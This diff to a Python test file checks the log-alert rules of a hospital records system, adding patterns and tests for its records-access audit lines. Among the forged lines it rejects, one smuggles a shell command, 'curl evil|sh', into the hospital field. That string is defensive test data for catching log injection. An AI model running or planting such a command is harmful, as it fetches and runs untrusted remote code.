@@ -84,6 +84,17 @@ GATED_SERVICES = "backend, celery, celery-worker, celery-beat, staff-worker"
 BATCH_LINE = (r"^ihr-batch: refused hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) "
               r"reason=(?P<reason>not_listed|bad_url|bad_method|nested|override) "
               r"method=(?P<method>GET|POST|PUT|PATCH|DELETE|other) route=(?P<route>[A-Za-z0-9_.:-]{1,100})$")
+# A records grant (deploy/logs/alerts/records.yml, P1-T11b4): our whole fixed line from the web
+# backend, a slug-shaped hospital, numbers, a reason code, an outcome and the IST hour (no values)
+RECORDS_CODES = "patient_request|legal|insurer|internal_audit|nabh_review|continuity_of_care"
+RECORDS_REFUSED_LINE = (r"^ihr-records: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) grant=none user=(?P<user>[0-9]{1,18}) "
+                        r"reason=(?:" + RECORDS_CODES + r"|invalid|none) outcome=refused hour=(?:[01][0-9]|2[0-3])$")
+RECORDS_GRANTED_LINE = (r"^ihr-records: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) grant=[0-9]{1,18} user=(?P<user>[0-9]{1,18}) "
+                        r"reason=(?:" + RECORDS_CODES + r") outcome=granted hour=(?:[01][0-9]|2[0-3])$")
+RECORDS_NIGHT_LINE = RECORDS_GRANTED_LINE.replace("hour=(?:[01][0-9]|2[0-3])$", "hour=(?:22|23|0[0-6])$")
+RECORDS_LINES = {"MrdRecordsRefused": (RECORDS_REFUSED_LINE, "_time:10m", "refusals:>=3"),
+                 "MrdRecordsVolume": (RECORDS_GRANTED_LINE, "_time:24h", "grants:>40"),
+                 "MrdRecordsOffHours": (RECORDS_NIGHT_LINE, "_time:1h", None)}
 # Postgres's own line for a failed login of one of our roles (known limit 1: a changed password)
 LOGIN_FAILED = r'FATAL: +password authentication failed for user "(?P<role>ihr_app|ihr_owner|ihr_audit_watch|ihr_dump)"$'
 STAGING_SH = (ROOT / "scripts" / "staging.sh").read_text()
@@ -296,9 +307,23 @@ class LogAlerts(unittest.TestCase):
         names = []
         for fname, r in self.rules():
             names.append(r["alert"])
-            self.assertIn(r["labels"]["severity"], {"critical", "warning"}, r["alert"])
+            # info: the one alert mailed at once to be looked at, never an outage (Q-K36 A)
+            severities = {"critical", "warning", "info"} if r["alert"] == "MrdRecordsOffHours" else {"critical", "warning"}
+            self.assertIn(r["labels"]["severity"], severities, r["alert"])
             by = re.findall(r"stats by \(([^)]*)\)", r["expr"])
-            if r["alert"] in HOSPITAL_LINES:
+            if r["alert"] in RECORDS_LINES:
+                pattern, window, threshold = RECORDS_LINES[r["alert"]]
+                self.assertEqual(by, ["hospital, user"], r["alert"])
+                # the web backend writes every line the rules read (asking, refusing); our whole
+                # fixed line only, a slug-shaped hospital, numbers for the grant and the user
+                self.assertRegex(r["expr"], r"^" + re.escape(window) + r' source:=container service:in\(backend\) '
+                                 r'"ihr-records: hospital=" \| extract_regexp "' + re.escape(pattern) + r'" '
+                                 r'\| filter hospital:~"\^\[a-z\]\[a-z0-9-\]\{2,30\}\$" ', r["alert"])
+                if threshold:
+                    self.assertTrue(r["expr"].endswith(f"| filter {threshold}"), r["alert"])
+                allowed = r"^\$(labels\.hospital|labels\.user|value)$"
+                self.assertNotIn("{{", r["annotations"]["action"], r["alert"])
+            elif r["alert"] in HOSPITAL_LINES:
                 prefix, pattern, services = HOSPITAL_LINES[r["alert"]]
                 self.assertEqual(by, ["hospital"], r["alert"])
                 # container lines (redact.lua) of the services that write the line only (never the
@@ -374,6 +399,7 @@ class LogAlerts(unittest.TestCase):
                                          "BatchRequestRefused", "DatabaseRoleLoginFailed", "DatabaseRoleRefused", "DatabaseSchemaGated",
                                          "DumpHospitalFailed", "DumpHospitalHeld",
                                          "FailedSignInsFromAddress", "HospitalNotServed", "HospitalRestoreFailed",
+                                         "MrdRecordsOffHours", "MrdRecordsRefused", "MrdRecordsVolume",
                                          "PackApplyFailed", "ParkedSchemaOverdue",
                                          "RateLimitedAddress", "ReleaseWindowOverrun", "SignInLockoutStorm",
                                          "SignInLockoutsFromAddress"])
@@ -415,6 +441,40 @@ class LogAlerts(unittest.TestCase):
         code = (ROOT / "plugins" / "ihr_platform" / "ihr_platform" / "batch.py").read_text()
         self.assertIn('REFUSAL_PREFIX = "ihr-batch: refused"', code)
         self.assertIn('f"{REFUSAL_PREFIX} hospital={slug} reason={reason} method={method} route={route}"', code)
+
+    def test_records_line_is_ours_alone(self):
+        """P1-T11b4: only the backend's whole records line; never a request path, a longer line,
+        a free-text reason or a non-numeric id. The backend writes exactly this line
+        (ihr_access/records.py: log_line)."""
+        rules = {r["alert"]: r for _, r in self.rules() if r["alert"] in RECORDS_LINES}
+        self.assertEqual(set(rules), set(RECORDS_LINES))
+        self.assertEqual(rules["MrdRecordsOffHours"]["labels"]["severity"], "info")
+        refused, granted, night = (re.compile(p) for p in (RECORDS_REFUSED_LINE, RECORDS_GRANTED_LINE, RECORDS_NIGHT_LINE))
+        ok = "ihr-records: hospital=alpha grant=none user=42 reason=invalid outcome=refused hour=09"
+        self.assertEqual(refused.match(ok)["user"], "42")
+        self.assertEqual(granted.match("ihr-records: hospital=alpha grant=17 user=42 reason=insurer outcome=granted hour=14")["hospital"], "alpha")
+        self.assertIsNotNone(night.match("ihr-records: hospital=alpha grant=17 user=42 reason=legal outcome=granted hour=23"))
+        self.assertIsNotNone(night.match("ihr-records: hospital=alpha grant=17 user=42 reason=legal outcome=granted hour=06"))
+        self.assertIsNone(night.match("ihr-records: hospital=alpha grant=17 user=42 reason=legal outcome=granted hour=07"))
+        self.assertIsNone(night.match("ihr-records: hospital=alpha grant=17 user=42 reason=legal outcome=granted hour=21"))
+        for forged in ('10.0.0.9 - - [x] "GET /ihr-records: hospital=fake grant=none user=1 reason=none outcome=refused hour=10" 404 179',
+                       "Not Found: /ihr-records: hospital=fake grant=none user=1 reason=none outcome=refused hour=10",
+                       "ihr-records: hospital=x;curl evil|sh; grant=none user=1 reason=none outcome=refused hour=10",
+                       "ihr-records: hospital=alpha grant=none user=1 reason=curious outcome=refused hour=10",
+                       "ihr-records: hospital=alpha grant=none user=dr.meera reason=none outcome=refused hour=10",
+                       "ihr-records: hospital=alpha grant=none user=1 reason=none outcome=refused hour=10 (and more)",
+                       "ihr-records: hospital=alpha grant=none user=1 reason=none outcome=refused hour=24",
+                       "ihr-records: hospital=alpha grant=none user=1 reason=none outcome=refused hour=10\nmore"):
+            self.assertIsNone(refused.search(forged), forged)
+        for forged in ("ihr-records: hospital=alpha grant=none user=1 reason=insurer outcome=granted hour=10",
+                       "ihr-records: hospital=alpha grant=17 user=1 reason=invalid outcome=granted hour=10",
+                       "ihr-records: hospital=alpha grant=17 user=1 reason=insurer outcome=expired hour=10"):
+            self.assertIsNone(granted.search(forged), forged)
+        code = (ROOT / "plugins" / "ihr_platform" / "ihr_access" / "records.py").read_text()
+        self.assertIn('LOG_PREFIX = "ihr-records:"', code)
+        self.assertIn('f"{LOG_PREFIX} hospital={_slug()} grant={_number(grant_id)} "', code)
+        self.assertIn('f"user={_number(user_id)} reason={code} outcome={outcome} hour={hour:02d}"', code)
+        self.assertIn('os.write(2, f"{line}\\n".encode())', code)
 
     def test_fleet_line_is_ours_alone(self):
         """As the pack line (S1), for the fleet runner's line (P1-T18a): only the three outcomes
@@ -610,7 +670,9 @@ class LogAlerts(unittest.TestCase):
                                  "BatchRequestRefused": None, "AuditHospitalCheckFailed": None,
                                  "AuditHospitalSealLate": None, "AuditEventRecorded": None,
                                  "DumpHospitalFailed": None, "DumpHospitalHeld": None,
-                                 "HospitalRestoreFailed": None, "ParkedSchemaOverdue": None})
+                                 "HospitalRestoreFailed": None, "ParkedSchemaOverdue": None,
+                                 "MrdRecordsRefused": None, "MrdRecordsVolume": None,
+                                 "MrdRecordsOffHours": None})
         anytime = sorted(r["alert"] for _, r in self.rules() if r["labels"].get("notify") == "anytime")
         self.assertEqual(anytime, ["FailedSignInsFromAddress", "RateLimitedAddress", "SignInLockoutsFromAddress"])
         cfg = func("monitoring_config")
